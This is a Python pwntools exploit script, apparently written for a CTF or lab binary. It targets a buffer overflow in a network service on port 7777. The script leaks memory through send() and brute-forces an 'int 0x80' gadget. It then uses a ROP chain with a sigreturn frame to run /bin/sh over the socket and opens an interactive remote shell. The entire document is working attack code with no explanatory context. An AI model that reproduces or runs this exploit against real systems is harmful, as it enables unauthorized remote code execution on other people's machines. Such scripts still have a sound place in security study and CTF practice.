from pwn import *
import sys

if len(sys.argv) < 2 : 
    log.info( "Usage: python hack.py [target URL]")
    exit(0)

bss = 0
try :
    bss = ELF('test1').bss() + 0x400
except IOError:
    log.info('test1 binary not found.. set bss as 0x0804a000')
    bss = 0x0804a000 + 0x400


force_len = 0x400
plt_send = 0x08048610
plt_recv = 0x080485f0
got_send = 0x0804a048
got_exit = 0x0804a020
fuc_send = 0
fuc_exit = 0
gadget_ppppr = 0x080489cc # pop pop pop pop ret
gadget_pr   = 0x080486a3 # pop ebp; ret;
gadget_lr   = 0x080486d1 # leave; ret;
gadget_int80 = 0

def connect() :
    return remote(sys.argv[1], 7777, level='error')

def getMemory(offset, length) :
    payload = 'A' * 0x408 + 'B' * 4
    payload += p32(plt_send)
    payload += p32(0)
    payload += p32(4)
    payload += p32(offset)
    payload += p32(length)
    payload += p32(0)
    
    ret = ''
    while True:
        sleep(0.1)
        s = connect()
        s.recv(1024)
        s.send(payload)
        try :
            ret = s.recvn(length)
        except EOFError:
            continue
        finally:
            s.close()
        break
    return ret


fuc_exit = u32(getMemory(got_send, 4))
p = log.progress('Finding "int 80" from ' + hex(fuc_exit))

i = 0
while True:
    a = getMemory(fuc_exit + i * force_len, force_len + 1)
    b = getMemory(fuc_exit - i * force_len, force_len + 1)
    target = '\xcd\x80'
    if target in a :
        gadget_int80 = fuc_exit + i * force_len + b.index(target)
        break
    elif target in b :
        gadget_int80 = fuc_exit - i * force_len + b.index(target)
        break
    i += 1

p.success('Found on : ' + hex(gadget_int80))


offset = 120
inject = 'echo H4CK >&4; /bin/sh 0<&4 2>&4 1>&4\0'

payload1 = ''
payload1 += 'A' * 0x408 + 'BBBB'
payload1 += p32(plt_recv)
payload1 += p32(gadget_ppppr)
payload1 += p32(4)
payload1 += p32(bss)
payload1 += p32(400)
payload1 += p32(0)
payload1 += p32(gadget_pr)
payload1 += p32(bss)
payload1 += p32(gadget_lr)

payload2 = ''
payload2 += 'BBBB' # EBP
payload2 += p32(plt_recv)
payload2 += p32(gadget_ppppr)
payload2 += p32(4)
payload2 += p32(bss - 0x300)
payload2 += p32(0x77)
payload2 += p32(0)

# SIGRTN
payload2 += p32(gadget_int80)

frame = SigreturnFrame(kernel='i386')
frame.eax = 0xb # syscall code
frame.ebx = bss + offset + 0x00 # executable path
frame.ecx = bss + offset + 0x0b + len(inject) # executable argument
frame.eip = gadget_int80
frame.esp = gadget_int80
frame.cs = 0x23
frame.ss = 0x2b
payload2 += str(frame)
payload2 += 'Z' * 8

payload2 += '/bin/sh\0'
payload2 += '-c\0'
payload2 += inject
payload2 += p32(bss + offset + 0x00)
payload2 += p32(bss + offset + 0x08)
payload2 += p32(bss + offset + 0x0b)
payload2 += p32(0)

payload3 = 'C' * 0x77

x = log.progress('Exploiting')
while True:
    sleep(.2)
    s = connect()
    try :
        s.send(payload1)
        s.recv(1024)
        sleep(.2)
        s.send(payload2)
        sleep(.2)
        s.send(payload3)

        if s.recvn(5) == 'H4CK\n' :
            x.success('Done.')
            s.interactive()
    except EOFError:
        pass
    finally:
        s.close()

